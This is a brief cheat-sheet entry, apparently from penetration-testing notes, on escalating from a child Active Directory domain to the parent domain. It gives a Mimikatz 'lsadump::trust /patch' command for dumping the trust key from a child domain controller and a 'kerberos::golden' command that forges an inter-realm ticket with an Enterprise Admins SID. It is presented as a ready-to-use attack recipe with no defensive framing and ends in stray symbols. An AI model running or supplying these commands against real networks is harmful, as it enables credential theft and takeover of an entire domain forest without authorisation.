## Domain Trust Key \(Domain Traversal\) 

On a Domain Controller in the child domain:

```text
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

Get the NT hash `(rc4_hmac_nt)` from underneath "`[ In ] child.test.com -> test.com`

Create a TGT for an Enterprise Admin in the parent domain:

```text
kerberos::golden /user:Administrator /domain:child.test.com /service:krbtgt  /sid:<current-domain-sid> /sids:<parent-domain-ea-group> /rc4:<trust-key> /target:test.com /ticket:C:\tickets\parent-trust.krb
```

Use TGT to request a TGS for a service on a DC in the parent domain.

$$$$$$$
